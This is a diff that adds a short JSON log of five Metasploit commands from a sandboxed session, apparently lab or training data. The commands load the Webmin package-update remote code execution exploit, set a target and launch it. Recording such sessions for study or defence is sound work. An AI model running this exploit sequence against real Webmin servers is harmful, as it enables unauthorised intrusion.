@@ -1,0 +1,5 @@
+{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:09:13.820Z", "cmd_type": "msf-command", "cmd": "use exploit/linux/http/webmin_packageup_rce"}
+{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:09:25.558Z", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:09:51.977Z", "cmd_type": "msf-command", "cmd": "set TARGET 0"}
+{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:10:00.217Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "25", "timestamp_str": "2021-04-22T15:10:06.228Z", "cmd_type": "msf-command", "cmd": "exploit"}
